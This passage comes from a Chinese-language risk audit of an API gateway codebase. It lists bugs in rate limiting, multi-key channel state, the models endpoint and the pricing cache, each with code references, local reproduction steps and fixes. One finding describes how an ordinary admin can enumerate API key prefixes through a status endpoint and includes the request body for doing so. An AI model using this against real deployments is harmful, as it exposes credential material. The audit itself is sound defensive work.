  - `service/notify-limit.go:57-86`：Redis 路径先 `RedisGet`，空值时 `RedisSet(key,"1",ttl)` 后直接放行；非空时解析 count，低于上限再 `RedisIncr`。并发请求可同时读到空值或同一个低计数并全部放行，`SET`/`INCR` 也没有用 Lua、事务或 `INCR` 返回值做原子阈值判断。
  - `service/notify-limit.go:89-117`：本地路径从 `sync.Map` 读取 `limitCount` 值，修改副本后 `Store`，没有互斥或 CAS；并发 goroutine 可能丢失增量并都看到 `Count <= limit`。关闭 Redis 的多实例部署还会变成每个进程各自限流，无法得到全局上限。
  - `service/notify-limit.go:57-68`、`service/notify-limit.go:93-102`：key 带 `time.Now().Format("2006010215")` 小时桶，但 TTL/过期判断用 `NotificationLimitDurationMinute`，默认 10 分钟；同一小时内 TTL 到期会重置计数，小时切换也会重置计数，实际不是稳定的“每小时最多 N 次”或“每 10 分钟最多 N 次”。
  - `docs/newapi-ops-risk-audit.md:6865-6888`：风险 228 已覆盖钱包/订阅共用 `quota_exceed` 事件类型和提醒口径误导；本轮新增聚焦限流实现的原子性、窗口和多实例一致性，不重复记录事件语义问题。
- 可能后果：低余额用户在高并发请求或流式请求集中结算时，可能收到超过运营配置上限的邮件、Bark、Gotify 或 Webhook 通知。通知服务失败时，上层还会写多条失败日志，叠加 URL/token 日志泄露风险。Redis 关闭的多实例部署会按实例数放大通知上限；Redis 开启时，竞态也会让瞬时并发突破上限。窗口语义不清会让客服难以解释“明明限制 2 次，为什么一小时内发了多次”或“为什么跨小时立刻又发”。
- 复现思路：本地把用户余额或订阅剩余额度置于阈值以下，设置 `NOTIFY_LIMIT_COUNT=2`，并发发起多条会完成扣费的 relay 请求；将通知目标配置为本地可观测 webhook 或不可达地址，统计同一用户同一 `quota_exceed` 在一个小时桶内的发送/失败次数。Redis 模式可并发命中空 key 或 count=1 的窗口；关闭 Redis 后在单进程用 goroutine 压测 `CheckNotificationLimit`，多实例时分别从不同进程触发，观察是否按进程放大。
- 修复建议：Redis 路径改为原子脚本或单命令语义，例如 Lua 中 `INCR` 后首次设置 TTL，并以递增后的返回值判断是否 `<= limit`；需要滑动窗口时使用 sorted set 或固定窗口时去掉混乱的小时桶/短 TTL 组合。内存路径至少使用 per-key mutex/atomic counter，并明确文档说明关闭 Redis 时无法跨实例限流。通知事件应进入 outbox/去重表，按 `user_id + event_type + asset_scope + window` 生成幂等键，发送成功/失败都记录可审计状态。配置文案要明确是“每 X 分钟最多 N 次”还是“每小时最多 N 次”。
- 优先级：P2
- 当前状态：已确认通知频控存在非原子计数、本地单进程限流和时间窗口语义不一致；尚未修复。

### 风险 257：通知发送前先消耗限流额度，配置缺失或发送失败会挤掉后续真正可达的低额度提醒

- 标题：`NotifyUser` 在检查邮箱、Webhook/Bark/Gotify URL、Gotify token 和实际发送之前就调用 `CheckNotificationLimit`。因此“用户没有通知地址”“SMTP/Webhook 网络失败”“Bark/Gotify 失败”等未成功投递的尝试，也会占用同一窗口的通知额度；后续配置修复或网络恢复后的真实低额度提醒可能被限流拦截。
- 影响范围：钱包低额度提醒、订阅低额度提醒、管理员上游模型更新通知、Root 渠道自动禁用/恢复通知、通知配置缺失用户、SMTP/Webhook/Bark/Gotify 临时故障、多实例客服排障。
- 触发条件：通知窗口内先发生两次配置缺失、目标不可达、SMTP 失败、Webhook 非 2xx、Bark/Gotify 非 2xx 或网络错误；同一用户同一 `data.Type` 后续再次触发重要通知；`NOTIFY_LIMIT_COUNT` 较低时更明显，默认值为 2。
- 涉及文件/函数：
  - `common/init.go:145-146`：通知默认限额为 `NOTIFY_LIMIT_COUNT=2`、窗口配置为 `NOTIFICATION_LIMIT_DURATION_MINUTE=10`。
  - `service/user_notify.go:51-65`：`NotifyUser` 先根据 `data.Type` 调用 `CheckNotificationLimit`，`!canSend` 时直接返回 `notification limit exceeded`；此时尚未检查具体通知通道配置，也未尝试发送。
  - `service/user_notify.go:67-105`：Email/Webhook/Bark/Gotify 分支在限流之后才检查 `NotificationEmail/WebhookUrl/BarkUrl/GotifyUrl/GotifyToken`，缺失时写 `skip sending ...` 并返回 nil，但限流计数已经被消耗。
  - `service/user_notify.go:108-115` 与 `common/email.go:36-103`：Email 发送失败会返回 SMTP 错误并写日志，但前置限流计数不会回滚。
  - `service/webhook.go:34-125`：Webhook 发送失败、SSRF 校验拒绝或非 2xx 状态返回错误；没有投递状态表，也不会释放前置限流计数。
  - `service/user_notify.go:118-185`、`service/user_notify.go:188-280`：Bark/Gotify 直连或 Worker 发送失败都会返回错误；前置限流计数同样保留。
  - `service/quota.go:492-495`、`service/quota.go:542-543`：钱包/订阅低额度通知失败只写系统错误日志，没有持久投递记录、重试任务或“发送失败但未占限流”的区分。
  - `service/user_notify.go:17-48`：Root 和管理员上游更新通知复用同一 `NotifyUser`，因此也会受到“失败先占额度”的影响；`sentCount++` 只统计 `NotifyUser` 返回 nil，缺失邮箱等 skip 场景会被算作成功。
  - `docs/newapi-ops-risk-audit.md:7925-7952`：风险 256 已覆盖限流计数非原子和窗口不一致；本轮新增聚焦投递状态与限流计数的顺序错误，不重复记录并发突破上限。
- 可能后果：用户刚好余额很低，但 SMTP 临时故障或 webhook 目标 500，前两次低额度提醒失败后，下一次真正应该发送的提醒会被 `notification limit exceeded` 拦截，用户可能完全没有收到充值或续订提醒。通知配置缺失的用户也会不断消耗限流额度，后台日志显示“skip sending email/webhook”，但上层调用返回 nil，管理员批量通知还会把这类 skip 算进 sentCount。客服排查时只能从分散的系统日志判断发生过失败、跳过或限流，无法在一个投递状态里回答“是否已通知用户、失败原因是什么、是否还会重试”。
- 复现思路：设置 `NOTIFY_LIMIT_COUNT=2`，用户选择 Webhook 通知但把 URL 配成会返回 500 或不可达；连续触发三次低额度通知，观察前两次写失败日志且第三次返回 `notification limit exceeded`。再把 webhook 修复为可达地址，在同一窗口内再次触发，观察仍可能被限流拦截。配置缺失场景可把 `notify_type=email` 且用户邮箱为空，触发两次 skip 后再补邮箱，验证后续提醒是否被同一 `quota_exceed` 限流挡住。
- 修复建议：通知限流应按投递状态建模，而不是在发送前无条件消耗。最小修复是先做通道配置校验，配置缺失直接记录 `skipped` 且不占发送限额；发送失败应记录 `failed`，并根据错误类型决定是否占用“尝试限额”还是进入重试退避。更完整方案是新增通知 outbox/delivery 表，字段包含 `user_id/event_type/channel/status/attempt_count/last_error/asset_scope/window_key`，成功发送才占“用户可见通知”额度，失败占“重试/错误限流”额度。批量管理员通知的 sentCount 必须只统计真实成功投递或至少区分 success/skipped/failed/limited。
- 优先级：P2
- 当前状态：已确认通知限流发生在配置校验和实际发送之前，缺失配置与发送失败会占用限流额度；尚未修复。

### 风险 258：多 key 状态更新遇到 usingKey 不存在时仍返回成功，Root 可能收到“已禁用/已启用”但实际状态没变

- 标题：多 key 渠道自动禁用/恢复依赖请求上下文里的 `usingKey` 查找当前 key index；如果请求期间 key 列表被编辑、删除自动禁用 key、复制/替换 key 或缓存与 DB 漂移，`handlerMultiKeyUpdate` 找不到 key 时只写 `failed to update multi-key status` 日志并返回。但 `UpdateChannelStatus` 外层继续 `SaveWithoutKey()` 并返回 true，`DisableChannel/EnableChannel` 随后发送 Root 通知，造成状态更新失败被误报为成功。
- 影响范围：多 key 渠道自动禁用、自动恢复、通道批量测试、余额不足自动禁用、Root 通知、渠道状态看板、故障 key 下线、key 轮换/删除后的事故排障。
- 触发条件：一个多 key 渠道正在处理请求或自动测试；该请求选中的 `usingKey` 在状态更新前已被管理员编辑、删除、替换、批量清理自动禁用 key，或当前实例 cache 与 DB 的 key 列表不一致；随后请求失败触发自动禁用，或自动测试成功尝试恢复 auto-disabled 渠道。
- 涉及文件/函数：
  - `types/channel_error.go:3-20`：`ChannelError` 携带 `UsingKey`，没有稳定 key id/fingerprint；状态更新只能用明文 key 在当前数组里查找。
  - `service/channel.go:28-33`：`DisableChannel` 只看 `model.UpdateChannelStatus(...AutoDisabled...)` 返回值；true 后立即通知 Root “通道已被禁用”。
  - `service/channel.go:36-42`：`EnableChannel` 同样只看 `UpdateChannelStatus(...Enabled...)` 返回值；true 后通知 Root “通道已被启用”。
  - `model/channel.go:641-664`：多 key 更新遍历当前 `keys` 查找 `usingKey`；`usingKey != ""` 且找不到时只写系统日志并 `return`，没有向调用方返回失败，也没有标记 no-op。
  - `model/channel.go:665-689`：只有找到 key 时才写 `MultiKeyStatusList/MultiKeyDisabledReason/MultiKeyDisabledTime` 或删除禁用状态；找不到 key 的路径不会改变 key 状态、channel status 或 `OtherInfo`。
  - `model/channel.go:706-735`：内存缓存开启时先调用 `handlerMultiKeyUpdate(channelCache, usingKey, status, reason)`；即使 handler 因 key 不存在提前返回，外层也没有记录失败状态。
  - `model/channel.go:746-778`：DB 更新路径在 `channel.Status != status` 时调用 `handlerMultiKeyUpdate`，随后无条件 `SaveWithoutKey()`；只要保存没报错就返回 true，无法区分“状态已更新”和“usingKey 不存在导致没更新”。
  - `controller/channel-test.go:951-959`：通道批量测试的自动禁用和自动恢复分别调用 `processChannelError`/`EnableChannel`，因此会把测试时的旧 `usingKey` 传入同一状态更新路径。
  - `controller/channel-billing.go:460-476`：渠道余额不足时，多 key 渠道会以 `usingKey=""` 禁用整条渠道，这是正向边界；本风险只针对非空 `usingKey` 找不到的 no-op 被误判成功。
  - `docs/newapi-ops-risk-audit.md:6380-6425`：风险 217 已覆盖多 key 成本和封禁缺少稳定 key 维度；本轮新增聚焦状态更新 no-op 被当成成功并触发 Root 误通知。
- 可能后果：Root 收到“通道 #X 已被禁用”，但实际故障 key 没有进入 `MultiKeyStatusList`，后续请求仍可能继续命中同一坏 key；或收到“通道 #X 已被启用”，但 auto-disabled 渠道/单 key 并未恢复，流量仍不可用。运营根据通知以为自动处置已经完成，延迟手工下线、恢复或更换 key。因为系统日志里只有一条 `using key not found`，通知内容没有 key index/fingerprint，也没有把 no-op 返回给上层，事故复盘需要同时比对 key 编辑时间、请求上下文和通知时间才能还原。
- 复现思路：本地创建多 key 渠道并让某个请求上下文选中 key-A；在触发 `DisableChannel` 前把渠道 key 列表替换为不包含 key-A，或直接构造 `types.ChannelError{UsingKey:"missing-key"}` 调用 `DisableChannel`。观察 `handlerMultiKeyUpdate` 记录 key not found，但 `UpdateChannelStatus` 仍返回 true，Root 通知被触发，DB 中 `MultiKeyStatusList` 和 channel status 没有对应变化。恢复路径可让 auto-disabled 多 key 渠道调用 `EnableChannel(channelId,"missing-key",...)`，观察同样误报成功。
- 修复建议：`handlerMultiKeyUpdate` 应返回结构化结果，例如 `updated bool, err error, keyIndex int`；`usingKey` 非空且找不到时 `UpdateChannelStatus` 必须返回 false/错误，禁止发送成功通知。多 key 状态更新应使用稳定 key id/fingerprint，而不是数组里的明文 key；删除 key 时保留 tombstone 以解释请求中的旧 key。Root 通知要区分 `channel_status_changed`、`key_status_changed`、`state_update_failed`，并包含 key index/fingerprint、原状态、新状态和 no-op 原因。自动测试/自动恢复如果状态没变，应记录 failed/noop，而不是当成成功恢复。
- 优先级：P2
- 当前状态：已确认多 key `usingKey` 不存在时状态更新 no-op 会被外层当成成功；尚未修复。

### 风险 259：多 key 手工启停只改 key 状态图，不同步 channel status/abilities，后台 key 状态会和真实路由相反

- 标题：`ManageMultiKeys` 的 `disable_key/disable_all_keys/enable_key/enable_all_keys/delete_disabled_keys` 直接改 `ChannelInfo.MultiKeyStatusList` 后调用 `channel.Update()` 和 `InitChannelCache()`，没有复用 `UpdateChannelStatus` 的“是否还有 enabled key”判断，也没有更新 `channels.status` 和 `abilities.enabled`。因此可以出现“所有 key 都禁用但渠道仍作为 enabled 候选接流量”，也可以出现“key 已启用但渠道仍 auto-disabled，不会接流量”。
- 影响范围：多 key 渠道手工维护、自动禁用后的人工恢复、批量禁用/启用 key、删除自动禁用 key、渠道 abilities 路由表、真实用户请求失败率、后台渠道状态和客服排障。
- 触发条件：管理员在多 key 管理弹窗手工禁用最后一个可用 key，或执行 `disable_all_keys`；或者一个多 key 渠道已因所有 key auto-disabled 导致 `channels.status=3`，管理员随后执行 `enable_key` 或 `enable_all_keys` 期望恢复；或者删除自动禁用 key 后剩余 key 可用性发生变化。
- 涉及文件/函数：
  - `controller/channel.go:1407-1447`：`disable_key` 只把指定 index 写成 `2` 并保存；没有检查是否已经没有 enabled key，也没有把 channel status 改为手动禁用/自动禁用或更新 abilities。
  - `controller/channel.go:1450-1490`：`enable_key` 只删除该 index 的状态和禁用原因；如果 channel 当前是 `ChannelStatusAutoDisabled`，这里不会把 `channel.Status` 改回 enabled，也不会调用 `UpdateAbilityStatus`。
  - `controller/channel.go:1492-1514`：`enable_all_keys` 清空所有 key 禁用状态，但同样不恢复 channel status/abilities；后台 key 列表可显示全部 enabled，而渠道仍可能在渠道表和 abilities 中 disabled。
  - `controller/channel.go:1516-1561`：`disable_all_keys` 会把所有当前 enabled key 写成手动禁用 `2`，但 channel row 仍可能保持 `ChannelStatusEnabled`，abilities 也保持 enabled。
  - `controller/channel.go:1643-1709`：`delete_disabled_keys` 删除 auto-disabled key 并重建状态图，但不重新计算“剩余 key 是否可用”和 channel status/abilities；当删除改变可用 key 集合时，渠道级状态可能继续保持旧值。
  - `model/channel.go:199-239`：真实路由选中渠道后才调用 `GetNextEnabledKey()`；如果所有 key 都被手工禁用，它会返回 `channel:no_available_key`，说明渠道仍可能先进入候选再失败。
  - `middleware/distributor.go:399-436`：分发上下文先设置 channel id/name/type，再调用 `GetNextEnabledKey()`；key 不可用错误发生在选中渠道之后，而不是在能力候选阶段被排除。
  - `model/ability.go:146-184`、`model/ability.go:191-250`：abilities 的 enabled 只由 `channel.Status == ChannelStatusEnabled` 派生；手工多 key 操作没有调用 `UpdateAbilityStatus` 或 `UpdateAbilities`，路由候选不会随 key 全禁用/恢复同步变化。
  - `model/channel.go:641-690` 与 `model/channel.go:706-778`：自动禁用/恢复路径会在 key 级状态变化后根据 `hasEnabledMultiKey` 调整 `channel.Status`，并由外层在状态变化时更新 abilities；`ManageMultiKeys` 绕开了这套逻辑。
  - `docs/newapi-ops-risk-audit.md:5070-5100`：风险 194 已覆盖自动启停按单次样本决策；`docs/newapi-ops-risk-audit.md:6420-6446`：风险 217 已覆盖 key 级成本和封禁归因。本轮新增聚焦手工 key 状态与 channel/ability 路由状态不一致。
- 可能后果：管理员为阻止某个供应商账号继续消耗，手工禁用所有 key 后，渠道列表仍显示渠道启用，abilities 仍把它作为可用候选；真实请求被选中后返回 “no enabled keys”，造成用户请求失败、重试噪声和错误日志。反向场景中，自动禁用后的渠道经过手工启用 key 或启用全部 key，后台 key 状态看起来已恢复，但 channel status/abilities 仍是 auto-disabled，流量不会回来，运营误以为恢复无效或上游仍故障。删除自动禁用 key 后若剩余 key 已可用，渠道也可能继续保持禁用；若剩余 key 不可用，也可能仍保持启用。最终表现是 key 级状态、渠道状态、能力路由和真实请求结果四套口径互相矛盾。
- 复现思路：本地创建多 key 渠道并确认 `channels.status=1`、abilities enabled；调用 `ManageMultiKeys` 的 `disable_all_keys`，再查询 key 状态、channel status 和 abilities，观察 key 全部 status=2 但渠道/abilities 仍 enabled；发起一次可命中该渠道的本地 relay，观察选中渠道后 `GetNextEnabledKey` 返回 no enabled keys。反向复现：让多 key 渠道通过自动禁用进入 `status=3`，调用 `enable_all_keys`，观察 key 状态清空但 channel status/abilities 仍 disabled。
- 修复建议：所有多 key 手工操作都应通过统一的 key 状态服务完成，并在同一事务内重新计算 `has_enabled_key`、`channel.status` 和 abilities。禁用最后一个 key 时应要求明确选择“禁用整条渠道”或阻止操作；启用任一 key/全部 key 时，如果渠道是 auto-disabled 且恢复条件满足，应把 channel status 改回 enabled 并更新 abilities，或明确提示还需要恢复渠道。`delete_disabled_keys` 需校验不能删除到空 key 集，并在删除后重算渠道可用性。接口响应应返回 `key_enabled_count/channel_status/abilities_enabled/recomputed`，前端不要只展示 key 级成功文案。
- 优先级：P2
- 当前状态：已确认多 key 手工管理只更新 key 状态图，不同步渠道级状态和 abilities；尚未修复。

### 风险 261：多 key 状态接口在 AdminAuth 下返回每个 key 前 10 位，绕开完整 key 查看所要求的 Root 安全验证边界

- 标题：完整渠道 key 查看接口需要 `RootAuth + CriticalRateLimit + DisableCache + SecureVerificationRequired`，但多 key 管理的 `get_key_status` 只继承渠道组 `AdminAuth`，并返回每个 key 的 `key_preview`（前 10 个字符）。这让普通管理员或系统 access token 类后台调用者无需 step-up 就能枚举多 key 渠道的 key 前缀。
- 影响范围：多 key 渠道、供应商 API key 前缀、管理员权限分层、密钥查看审计、客服/运营截图、供应商账号识别、与其它日志片段拼接后的凭证风险。
- 触发条件：用户具备普通 Admin 后台权限；目标渠道是多 key；调用 `/api/channel/multi_key/manage` 且 action 为 `get_key_status`；或前端未来开始展示该字段；key 前缀足以标识供应商、账号、批次或和其它泄露片段组合。
- 涉及文件/函数：
  - `router/api-router.go:233-241`：渠道路由整体使用 `AdminAuth`，只有 `POST /api/channel/:id/key` 额外叠加 `RootAuth`、限流、禁缓存和安全验证。
  - `controller/channel.go:404-432`：`GetChannelKey` 明确依赖安全验证中间件，读取完整 key 后写“查看渠道密钥信息”系统日志。
  - `controller/channel.go:1231-1239`：`MultiKeyManageRequest` 中 `get_key_status` 与启停/删除等操作走同一个多 key 管理入口。
  - `controller/channel.go:1254-1260`：`KeyStatus` 响应包含 `KeyPreview`，注释为 key 前 10 字符。
  - `controller/channel.go:1271-1290`：`ManageMultiKeys` 读取包含密钥的渠道并加 per-channel lock；没有额外 Root、安全验证或查看密钥审计。
  - `controller/channel.go:1292-1405`：`get_key_status` 为每个 key 构造 `keyPreview` 并随 `keys` 数组返回；分页和状态筛选不会移除该字段。
  - `web/default/src/features/channels/api.ts:337-363`：前端 API 封装对 `get_key_status` 只调用普通 multi-key manage 接口，没有安全验证流程。
  - `web/default/src/features/channels/types.ts:177-183`：前端类型接收 `key_preview`；已确认弹窗未展示，但字段仍到达浏览器和可被直接 API 调用获取。
  - `docs/newapi-ops-risk-audit.md:7137-7161`：风险 237 已覆盖批量新增把 key 前 8 位持久写入渠道名称；本轮新增聚焦多 key 状态接口直接返回前 10 位预览，不依赖批量命名开关。
- 可能后果：站点把“完整 key 查看”设计成 Root step-up 高危操作，但普通 Admin 仍可通过多 key 状态接口拿到每个 key 的前 10 位。对于常见 `sk-...`、`sk-ant-...`、代理商自定义前缀或同批导入 key，前 10 位可能足以识别供应商、账号/项目、导入批次，或与自动禁用通知、渠道名称、日志截图中的其它片段拼接，降低密钥保密边界。因为该路径不是 `GetChannelKey`，不会留下“查看渠道密钥信息”的审计日志；运营审计看到的是普通 key 状态查询，而不是密钥材料接触。
- 复现思路：使用普通 Admin 会话创建或选择一个多 key 渠道，调用 `/api/channel/multi_key/manage`，请求体为 `{"channel_id":X,"action":"get_key_status","page":1,"page_size":50}`；观察响应 `data.keys[].key_preview` 是否包含每个 key 的前 10 位。对照调用 `/api/channel/:id/key`，确认后者需要 Root 和安全验证。全程使用本地假 key，不接触真实 provider。
- 修复建议：多 key 状态接口不应默认返回真实 key 前缀。改为返回不可逆 fingerprint，例如 `sha256(key)[:10]`，字段命名为 `key_fingerprint` 而不是 `key_preview`；如确需查看真实前缀，应复用 `RootAuth + SecureVerificationRequired`，记录专门审计日志，并支持最小化返回单个 key 而不是整页 key 前缀。前端确认操作应使用 fingerprint 识别，不使用真实前缀；历史 `batch_add_set_key_prefix_2_name` 也应迁移到 fingerprint 语义，统一密钥材料脱敏策略。
- 优先级：P2
- 当前状态：已确认多 key 状态接口返回真实 key 前 10 位预览，且该路径只在 AdminAuth 下；尚未修复。

### 风险 262：多 key replace 保留旧 `ChannelInfo` 状态图，新 key 池会继承旧 index 的禁用状态、原因和时间

- 标题：更新多 key 渠道时，后端先把原渠道 `ChannelInfo` 整段复制到本次更新对象；`key_mode=replace` 分支没有清理 `MultiKeyStatusList/MultiKeyDisabledReason/MultiKeyDisabledTime`。`channel.Update()` 只按新 key 数量删除越界的 status index，不会在 key 内容变化时重置同 index 状态，也不会清理越界的 reason/time。因此替换成新 key 池后，新 key 会按旧数组下标继承旧 key 的禁用状态和故障原因。
- 影响范围：多 key 渠道 replace 更新、故障 key 池整体轮换、供应商账号迁移、自动禁用恢复、手工禁用状态、渠道复制后的再编辑、客服排障和供应商 key 成本隔离。
- 触发条件：原多 key 渠道存在 `MultiKeyStatusList`，例如某些 index 被手工禁用 `2` 或自动禁用 `3`；管理员使用编辑渠道的 replace 模式提交一批不同 key，且新 key 数量大于等于旧禁用 index，或数量变化后仍有部分 index 重叠；随后渠道继续路由或查看 key 状态。
- 涉及文件/函数：
  - `controller/channel.go:857-861`：`PatchChannel` 支持 `key_mode`，用于多 key append/replace。
  - `controller/channel.go:879-895`：`UpdateChannel` 始终把 `originChannel.ChannelInfo` 复制到本次更新对象，仅允许覆盖 `MultiKeyMode`；这会把旧 `MultiKeyStatusList/MultiKeyDisabledReason/MultiKeyDisabledTime` 带入后续保存。
  - `controller/channel.go:897-972`：append 模式会解析 existing/new key 并去重追加，这是正向边界。
  - `controller/channel.go:973-975`：replace 模式注释为“直接使用新密钥”，没有清空或重建旧 key 状态图。
  - `controller/channel.go:977-985`：保存后刷新缓存并返回；没有返回“旧禁用状态被继承/清理”的 diff。
  - `model/channel.go:526-555`：`Channel.Update()` 会基于当前 `channel.Key` 重算 `MultiKeySize`。
  - `model/channel.go:556-563`：更新时只删除 `MultiKeyStatusList` 中 `idx >= MultiKeySize` 的项；不会在 key 内容变化时清空同 index 状态，也不会同步清理 `MultiKeyDisabledReason/MultiKeyDisabledTime` 的越界项。
  - `model/channel.go:216-239`：真实路由只看 `MultiKeyStatusList` 判断 enabled key；新 key 如果继承了旧 index 的 disabled 状态，就不会被选中，或在所有 index 都继承 disabled 时返回 no enabled keys。
  - `controller/channel.go:1292-1405`：多 key 状态查询会把旧 disabled reason/time 显示到新 key index 上，进一步误导运营以为新 key 也发生过同样故障。
  - `docs/newapi-ops-risk-audit.md:7078-7103`：风险 235 已覆盖复制渠道浅拷贝会继承 `ChannelInfo`；`docs/newapi-ops-risk-audit.md:7107-7131`：风险 236 已覆盖 replace 不去重。本轮新增聚焦 replace 新 key 池继承旧禁用状态图，而不是复制或重复 key。
- 可能后果：运营发现一批 key 被封禁，于是用 replace 模式换成全新 key 池；如果旧 index 0、2、5 是 auto-disabled，新 key 池的第 1、3、6 个 key 会立刻显示 auto-disabled，并不会被 `GetNextEnabledKey()` 选中。更糟糕的是禁用原因和时间来自旧 key，后台会显示新 key 在替换前就已因旧原因禁用，事故时间线无法解释。若旧 key 池全部禁用，新 key 池可能一上线就全部不可用，渠道仍处于禁用或无 enabled key 状态，运营误以为新凭证也有问题。反向地，越界 reason/time 未清理会留下不可见脏数据，后续再次扩容到相同 index 时可能重新浮现旧原因。
- 复现思路：本地创建三 key 渠道，手工或自动把 index 1 置为 auto-disabled 并写 reason/time；随后用 `UpdateChannel` 的 `key_mode=replace` 提交三条完全不同的新 key。调用 `get_key_status`，观察新 index 1 是否仍显示旧 auto-disabled reason/time；发起路由选择，观察该新 key 是否被跳过。再用更短 key 池替换，检查 `MultiKeyDisabledReason/MultiKeyDisabledTime` 是否仍保留越界数据。
- 修复建议：replace 模式必须按 key identity 处理状态迁移。最小修复是在 `key_mode=replace` 时清空 `MultiKeyStatusList/MultiKeyDisabledReason/MultiKeyDisabledTime/MultiKeyPollingIndex`，并根据新 key 数重建干净 `ChannelInfo`；若要保留状态，只能按稳定 key fingerprint 匹配同一 key，不能按数组 index 继承。`Channel.Update()` 清理越界 status 时也应同步清理 reason/time，并在 key 列表内容变化时重置 polling index。接口响应应返回状态迁移摘要：保留了哪些 key 状态、清除了哪些旧状态、渠道级 status/abilities 是否重算。
- 优先级：P2
- 当前状态：已确认多 key replace 会保留旧 `ChannelInfo` 状态图，同 index 新 key 可能继承旧禁用状态；尚未修复。

### 风险 265：Anthropic 兼容 `/v1/models` 在可见模型为空时直接取首尾元素，合法空权限会变成 panic/500

- 标题：`ListModels` 对 OpenAI/Gemini 空模型列表可以返回空数组，但 Anthropic 分支会无条件访问 `useranthropicModels[0]` 和 `useranthropicModels[len-1]`。当 token model limits 为空、token 限制的模型都未配置计费、用户分组没有 enabled abilities，或运营刚下线某分组模型时，带 `x-api-key + anthropic-version` 请求 `/v1/models` 会从“无可用模型”变成 panic/500。
- 影响范围：Anthropic 兼容客户端模型发现、Claude SDK/代理启动探测、空权限 token、模型下线窗口、未配置计费模型过滤、系统日志噪声、可用性监控和客服排障。
- 触发条件：请求 `/v1/models` 且携带 Anthropic 兼容头；`ListModels` 根据 token group、auto group、token model limit 和 `HasModelBillingConfig` 过滤后得到 0 个模型。该状态可以由正常配置产生，不需要畸形 `channels.models`：例如启用模型限制但 `model_limits=""`，或把某 token 仅限制到未配置价格/倍率的模型且用户未开启未配置模型放行。
- 涉及文件/函数：
  - `router/relay-router.go:19-30`：`/v1/models` 只要带 `x-api-key` 和 `anthropic-version` 就调用 `controller.ListModels(...ChannelTypeAnthropic)`。
  - `controller/model.go:208-278`：模型列表会按 token model limit、token group/auto group、enabled abilities 和 `HasModelBillingConfig` 生成 `userModelNames`；这些过滤都可能合法地产生空列表。
  - `controller/model.go:282-296`：Anthropic 分支把 `userOpenAiModels` 转成 `useranthropicModels` 后直接读取 `[0]` 和 `[len-1]`，没有空数组保护。
  - `model/token.go:336-350`：`ModelLimitsEnabled=true` 且 `ModelLimits=""` 时，`GetModelLimitsMap()` 返回空 map；`controller/token.go:290-299` 更新 token 时会保存 `ModelLimitsEnabled/ModelLimits`，未见后端阻止空限制集。
  - `main.go:163-170` 与 `middleware/recover.go:11-25`：panic 会被恢复并返回 `new_api_panic` 500，同时写系统日志/堆栈，不会退出进程但会制造错误噪声。
  - `docs/newapi-ops-risk-audit.md:5276-5304`：风险 199 已把 Anthropic 空列表 panic 作为畸形模型字符串的附带稳定性风险提到；本轮新增聚焦正常空权限/空可见模型也能触发该 panic。
- 可能后果：运营创建“暂时不可用”的 token、下线某分组全部模型，或把未配置价格模型从用户列表中过滤掉后，Anthropic 客户端的模型发现请求会收到 500 而不是空列表或权限错误。部分客户端会在启动或健康检查时反复探测 `/v1/models`，造成 panic 日志刷屏、错误告警和用户认为平台整体不可用。因为 OpenAI/Gemini 分支能返回空列表，同一 token 在不同兼容协议下表现不一致，客服排查时容易误判为 Anthropic header 或 SDK 问题。
- 复现思路：本地创建 token，设置 `model_limits_enabled=true` 且 `model_limits=""`，或者设置为一个没有计费配置且未允许未配置模型的模型名。使用该 token 请求 `GET /v1/models`，带 `x-api-key` 和 `anthropic-version` 头，观察是否返回 `new_api_panic` 500；去掉 Anthropic 头或请求 Gemini 兼容模型列表，对比是否返回空数组。
- 修复建议：Anthropic 分支应允许空列表，返回 `data: []`、`has_more: false`，并把 `first_id/last_id` 设为空字符串、`null` 或直接省略；如果协议要求首尾 ID，应在空模型时返回清晰的 403/404 权限错误而不是 panic。token 保存时也应校验 `model_limits_enabled=true` 不能配空白 `model_limits`，或明确把它解释为“无模型可用”。为 `/v1/models` 三个兼容分支增加空模型列表测试，覆盖 token 空限制、未配置计费过滤和空分组。
- 优先级：P2
- 当前状态：已确认 Anthropic 兼容模型列表空结果会触发数组越界 panic；尚未修复。

### 风险 266：模型价格/渠道能力变更不会统一失效 pricing cache，价格页可能短期展示旧价格但真实请求按新价扣费

- 标题：`GetPricing()` 有 1 分钟缓存，模型 metadata 变更会 `RefreshPricing()`，但传统 `ModelRatio/ModelPrice/GroupRatio/CompletionRatio/CacheRatio/ImageRatio/AudioRatio` 等计费 option 更新只刷新 ratio_setting 自身和 exposed data cache，没有清空 `pricingMap`；渠道新增/删除/编辑、abilities 重建和上游模型自动同步也只刷新 channel runtime cache，不刷新 pricing cache；vendor CRUD 也不刷新。结果是公开价格页、模型管理页附加的 enable groups/计费类型和 supported endpoint 可能在 Root 刚改价、下线模型或修复供应商后继续展示旧口径。
- 影响范围：公开 `/api/pricing`、默认模型广场、模型管理页 enable groups/计费类型、供应商筛选、supported endpoint 展示、用户价格预期、价格变更公告、促销/涨价/紧急下架、渠道能力上下线和多实例 pricing cache 一致性。
- 触发条件：Root/Admin 更新 `ModelPrice/ModelRatio/CompletionRatio/GroupRatio/GroupGroupRatio/CacheRatio/CreateCacheRatio/ImageRatio/AudioRatio/AudioCompletionRatio` 等传统 option；或新增/删除/编辑渠道导致 enabled abilities 变化；或上游模型同步自动加入/移除模型；或创建/更新/删除 vendor。此前已有用户/匿名访问过 `/api/pricing`，本实例 `pricingMap` 未过期。
- 涉及文件/函数：
  - `model/pricing.go:66-78`：`GetPricing()` 在 `pricingMap` 非空且未超过 1 分钟时直接返回缓存；`model/pricing.go:80-87` 才提供显式 `InvalidatePricingCache()`。
  - `model/pricing.go:288-340`：pricing cache 的内容来自 enabled abilities、models metadata、vendors 和 ratio_setting 的价格/倍率；这些都是会被后台高频修改的运营口径。
  - `model/option.go:536-553`：`ModelRatio/GroupRatio/GroupGroupRatio/CompletionRatio/ModelPrice/CacheRatio/CreateCacheRatio/ImageRatio/AudioRatio/AudioCompletionRatio` 更新只调用对应 ratio_setting loader。
  - `setting/ratio_setting/model_ratio.go:368-398`、`setting/ratio_setting/cache_ratio.go:147-152`：ratio_setting loader 只回调 `InvalidateExposedDataCache`，未触发 `model.InvalidatePricingCache()`。
  - `model/option.go:610-617`：只有 `billing_setting.*` 分层配置会显式 `InvalidatePricingCache()`，传统计费 option 没有同等处理。
  - `controller/pricing.go:79-95`：`ResetModelRatio` 调用 `model.UpdateOption("ModelRatio", ...)` 后又直接更新 ratio_setting，但同样没有刷新 pricing cache。
  - `controller/channel.go:687-700`、`controller/channel.go:977-983`、`controller/channel.go:1120-1131`：删除、更新、批量 tag 等渠道能力变更会 `InitChannelCache()`，没有刷新 pricing cache。
